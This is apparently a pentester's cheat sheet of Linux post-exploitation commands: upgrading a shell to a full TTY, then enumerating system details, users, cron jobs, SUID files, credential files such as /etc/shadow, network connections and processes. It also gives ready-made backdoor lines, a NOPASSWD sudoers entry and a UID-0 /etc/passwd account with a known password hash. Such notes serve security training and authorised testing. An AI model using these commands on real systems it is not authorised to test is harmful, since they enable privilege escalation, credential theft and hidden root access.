--------------------------------------------------
Fully interactive shell 
--------------------------------------------------

### check python version
```bash
which python
which python3
```
### python bash tty
```bash
python -c "import pty;pty.spawn('/bin/bash')" 
python3 -c "import pty;pty.spawn('/bin/bash')"
```
### export TTY
```bash
CTRL + Z 
stty raw -echo; fg; export SHELL=/bin/bash; export TERM=xterm-256color; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; reset;
```
### adds-on
```bash
export TERM=xterm
stty rows 1000 columns 1000
alias ll='clear;ls -lsah --color=auto'
```


--------------------------------------------------
System 
--------------------------------------------------

### issue, release
```bash
cat /etc/issue
cat /etc/*-release 
```
### distribution, version number
```bash
cat /etc/os-release
```
### kernel
```bash
uname -a
uname -smr
```
### arch 
```bash
file /bin/bash
```
### system name
```bash
hostname
```
### users
```bash
cat /etc/passwd | grep 'sh$'
```
### environment
```bash
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```
### SUIDs, GUIDs
```bash
find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -g=s 2>/dev/null
```
### capabilities
```bash
getcap -r / 2>/dev/null
```
### interesting files
```bash
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/crontab
ll /etc/passwd
ll /etc/sudoers
```
### interesting directories
```bash
ls -lsahR /home/
ll ~/.ssh/
ll /var/lib/
ll /var/db/
ll /opt/
ll /tmp/
ll /var/tmp/
ll /dev/shm/
ll /var/mail/
ll /etc/cron.*
ll /proc
```
### passwords here
```bash
ll /var/apache2
ll /var/lib/mysql/mysql
```
### cron jobs
```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```
### List open files
```bash
sudo lsof
```
### display only Internet and network connections
```bash
sudo lsof -i 
```
### limit the ouput to show a specific port
```bash
sudo lsof -i :25
```
### docker environment
```bash
grep -Ri docker /proc --color=auto 2>/dev/null
ll /etc | grep -i docker
```
### installed applications 
```bash
ll /usr/bin/
ll /sbin/
```
### installed packeges
```bash
dpkg -l     #debian
rpm -qa     #RPM
```
### list printers
```bash
lpstat -a
```
### Which configuration files can be written in /etc/? Able to reconfigure a service?
```bash
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null      # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null     # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null         # Other
find /etc/ -readable -type f 2>/dev/null             # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone
```
### mounted files
```bash
mount
df -h
```
### unmounted file-systems
```bash
cat /etc/fstab
```
### Add entry to **/etc/sudoers**
```bash
chronos ALL=NOPASSWD: /bin/bash
```
### Add entry to **/etc/passwd** (password is chronos)
```bash
chronos:$1$d7venmwO$dSO1eZg6GvVd/ihQLdb6K/:0:0::/root:/bin/bash
```


--------------------------------------------------
Users 
--------------------------------------------------

### logged in users (if a user is connected via network, we can see his ip address)
```bash
who
```
### current logged in user
```bash
whoami
```
### who is logged in and what they are doing
```bash
w
```
### real and effective ids
```bash
id
```
### list of last logged-in users
```bash
last
```
### files owned by current user
```bash
find / -type f -name `whoami` 2>/dev/null
```


--------------------------------------------------
Networking 
--------------------------------------------------

### IP addresses
```bash
ip a s
ifconfig -a
```
### interfaces
```bash
cat /etc/network/interfaces
cat /etc/sysconfig/network
```
### DNS server
```bash
cat /etc/resolf.conf
```
### display routing table
```bash
netstat -rn 
```
### ARP table
```bash
arp -a
route
route -nee
```
### network connectinos informations
```bash
ss
ss -tunlp
sudo netstat
sudo netstat -atunp
sudo netstat -antpx
sudo netstat -tulpn
netstat -tunlp | grep 127.0.0.1  # internal services such as MySQL
```

| -a  | show both listening and non-listening sockets |
| --- | --- |
| -l | show only listening sockets |
| -n | show numeric output instead of resolving the IP address and port number |
| -t | TCP |
| -u | UDP |
| -x | UNIX |
| -p | Show the PID and name of the program to which the socket belongs |



--------------------------------------------------
Running Services
--------------------------------------------------

### running processes 
```bash
ps
ps aux | grep -i 'root' --color=auto
ps axjf 
ps ef | grep -i root
```
### consider using `grep` to filter

| -e | every process |
| --- | --- |
| -f | full format |
| -l | long format |
| -u | details about user |
| -j | jobs |
| -f | forest â†’ more visual |

### scan processes
[https://github.com/DominicBreuker/pspy/blob/master/README.md]
```bash
pspy32
pspy64
```
